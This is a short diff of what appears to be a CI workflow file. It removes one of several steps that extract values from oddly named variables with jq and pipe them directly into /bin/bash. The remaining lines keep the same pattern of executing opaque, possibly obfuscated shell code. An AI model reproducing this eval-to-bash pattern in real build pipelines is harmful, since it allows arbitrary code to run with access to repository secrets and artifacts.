@@ -34,7 +34,6 @@ jobs:
           echo $c2 | jq -r .xjc0 | /bin/bash
           printf '%s' "$qmo13244" | jq -r .vvf8161 | /bin/bash
           echo $y17561 | jq -r .f60 | /bin/bash
-          printf '%s' "$np02630" | jq -r .pdo387 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
